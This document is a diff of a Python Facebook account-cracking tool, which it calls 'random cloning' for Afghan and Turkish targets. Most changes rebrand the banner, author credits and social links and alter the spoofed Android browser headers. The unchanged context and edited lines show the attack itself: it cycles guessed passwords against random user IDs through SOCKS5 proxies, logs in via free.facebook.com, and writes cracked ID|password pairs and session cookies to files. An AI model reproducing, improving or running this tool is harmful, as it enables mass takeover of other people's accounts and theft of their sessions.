@@ -12,9 +12,9 @@ from pathlib import Path
 import requests
 from bs4 import BeautifulSoup as bxx
 import os,base64,zlib,pip,urllib,sys,time,platform,pip,uuid,subprocess
-print('\033[1;32m FOLLOW MY TELEGRAM CHANNEL..\033[1;32m')
+print('\033[1;34m FOLLOW MY FACEBOOK..\033[1;31m')
 #os.system("pip uninstall urllib3 requests chardet idna certifi -y");os.system("pip install urllib3 requests chardet idna certifi")
-os.system('xdg-open https://t.me/Barie_tech007')
+os.system('xdg-open https://www.facebook.com/profile.php?id=661450917')
 print(' ')
 from bs4 import BeautifulSoup as sop
 try:
@@ -154,24 +154,23 @@ except Exception as e:
     
 prox=open('socks5.txt','r').read().splitlines()    
 
-logo=("""                  
-
- \33[1;30m██╗  ██╗ █████╗ \033[1;31m██████╗ ██╗    ██╗ \033[1;32m█████╗ ███╗   ██╗  
- \33[1;30m██║ ██╔╝██╔══██╗\033[1;31m██╔══██╗██║    ██║\033[1;32m
- \33[1;30m█████╔╝ ███████║\033[1;31m██████╔╝██║ █╗ ██║\033[1;32m███████║██╔██╗ ██║  
- \33[1;30m██╔═██╗ ██╔══██║\033[1;31m██╔══██╗██║███╗██║\033[1;32
- \33[1;30m██║  ██╗██║  ██║\033[1;31m██║  ██║╚███╔███╔╝\033[1;32m██║  ██║██║ ╚████║  
- \33[1;30m╚═╝  ╚═╝╚═╝  ╚═╝\033[1;31m╚═╝  ╚═╝ ╚══╝╚══╝ \033[1;32m╚═╝  ╚═╝╚═╝  ╚═══╝  
-\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
-╠══[\033[1;33m[•] AUTHOR   \33[0;m:\033[1;35m LOY UZBEK & \033[1;36mBACHA
-╠══[\033[1;32m[•] FACEBOOK \033[1;32m:\033[1;32m OMAR & \033[1;33mSADAT
-╠══[\033[1;34m[•] GITHUB \033[1;32m:\033[1;34m HAJI-OMAR 
-╠══[\033[1;33m[•] STATUS\033[1;33m   :\033[1;31m FREE\33[1;37m
-╠══[\033[1;32m[•] VERSION  : 0.1
-\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;37m""")
+logo=("""
+ \33[1;34m .d8b.  d88888b  d888b   d8888b.  .d88b.  db    db 
+ \33[1;31md8' `8b 88'     88' Y8b  88  `8D .8P  Y8. `8b  d8' 
+ \33[1;33m88ooo88 88ooo   88       88oooY' 88    88  `8bd8'  
+ \33[1;35m88~~~88 88~~~   88  ooo  88~~~b. 88    88    88    
+ \33[1;31m88   88 88      88. ~8~  88   8D `8b  d8'    88    
+ \33[1;34mYP   YP YP       Y888P   Y8888P'  `Y88P'     YP
+\033[0;31m╭─────────────────────────────────────────────────╮\033[1;31m
+┃\033[1;32m (✯)     AUTHOR   :   AFG BOY                (✯) ┃
+┃\033[1;31m (✯)     FACEBOOK :   OMAR SADAT             (✯) ┃
+┃\033[1;35m (✯)     GITHUB   :   OMAR-511               (✯) ┃
+┃\033[1;31m (✯)     STATUS   :   FREE                   (✯) ┃
+┃\033[1;32m (✯)     VERSION  :   0.1                    (✯) ┃
+\033[0;31m╰─────────────────────────────────────────────────╯\033[1;31m""")
 
 def lines():
-	print(f'\033[0;95m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37') 
+	print(f'\033[0;31m╰─────────────────────────────────────────────────╯\033[1;31') 
  
 loop = 0
 oks = []
@@ -196,10 +195,10 @@ def dynamic(text):
 def barie():
     os.system('clear')
     print(logo)
-    print(' [1] RONDOM CLONING')
-    print(' [0] EXIT')
+    print('\33[1;35m┃ (✯)  (1) RONDOM CLONING                     (✯) ┃')
+    print('\33[1;31m┃ (✯)  (0) EXIT                               (✯) ┃')
     lines()
-    opt = input(' [+] CHOOSE OPTION:-  ')
+    opt = input('  \33[1;32m  (+)  CHOOSE OPTION:-  ')
     if opt == '1':
         riaz()
     
@@ -207,18 +206,18 @@ def barie():
 def riaz():
 	os.system('clear')
 	print(logo)
-	print('[1] AFGHAN CLONING')
-	print('[2] TURKIYE CLONING')
-	print('[3] FOLLOW MY TELEGRAM')
-	print('[0]\x1b[1;91m EXIT ')
+	print(' \33[1;32m(1) AFGHAN CLONING')
+	print(' \33[1;33m(2) TURKIYE CLONING')
+	print(' \33[1;35m(3) FOLLOW MY FACEBOOK')
+	print(' \33[1;31m(0) EXIT ')
 	lines()
-	riaz1 = input('[•] SELECT OPTION : ')
+	riaz1 = input(' \33[1;34m(✯) SELECT OPTION : ')
 	if riaz1 =='1':
 		annu()
 	if riaz1 =='0':
 		exit()
 	if riaz1 =='3':
-		os.system('xdg-open https://t.me/karwantech12')
+		os.system('xdg-open https://www.facebook.com/profile.php?id=661450917')
 	if riaz1 =='2':
 		bangla()
 	else:
@@ -229,25 +228,25 @@ def riaz():
 def annu():
     os.system('clear')
     print(logo)
-    print('[1] METHOD_1_')
-    print('[4] \x1b[1;91mBACK MENU ')
+    print(' \33[1;35m(1) METHOD_1_')
+    print(' (4) \x1b[1;91mBACK MENU ')
     lines()
-    riaz1 = input('[+] CHOOSE OPTION : ')
+    riaz1 = input('\33[1;32m(+) CHOOSE OPTION : ')
     if riaz1 =='1':
     	m1()
     if riaz1 =='4':
     	riaz()
     else:
-        print('\n\033[1;37m[+] SELECT VALID OPTION \033[0;97m')      
+        print('\n\033[1;31m[+] SELECT VALID OPTION \033[0;97m')      
   
 def bangla():
 	os.system('clear')
 	print(logo)
-	print('[1] TURK CRACK _M 1')
-	print('[2] TURK CRACK _M 2')
-	print('[3]\x1b[1;91m BACK MENU')
+	print(' \33[1;35m(1) TURK CRACK _M 1')
+	print(' \33[1;32m(2) TURK CRACK _M 2')
+	print(' \33[1;34m(3)\x1b[1;91m BACK MENU')
 	lines()
-	riaz1 = input('[+] SELECT OPTION : ')
+	riaz1 = input(' \33[1;35m(+) SELECT OPTION : ')
 	if riaz1 =='1':
 		b1()
 	if riaz1 =='2':
@@ -375,7 +374,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write(f'\r[\033[1;97mOMAR-511🇦🇫\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r( ☔ AFG-BOY ☔ ) %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
             free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -393,14 +392,14 @@ def rcrack(uid,pwx,tl):
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
             'cache-control': 'max-age=0',
-            'dpr': '2',
-            'sec-ch-prefers-color-scheme': 'dark',
+            'dpr': '3',
+            'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
             'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
             'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"SM-A102N"',
+            'sec-ch-ua-model': '"SM-G610F"',
             'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-ch-ua-platform-version': '"8.1.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
@@ -413,15 +412,15 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[OMAR-OK] '+uid+' | '+ps+'\n\033[1;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m');print(50*'\033[1;35m━')
-                open('OMAR-OK.txt', 'a').write(uid+' | '+ps+ '\n')
+                print('\033[1;32m[AFG-511-OK] '+uid+' | '+ps+'\n\033[1;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m');print(50*'\033[1;35m━')
+                open('AFG-511-OK.txt', 'a').write(uid+' | '+ps+ '\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                #print('[OMAR-CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('OMAR-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                #print('[AFG-511-CP] '+uid+' | '+ps+'\x1b[1;97m')
+                open('AFG-511-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
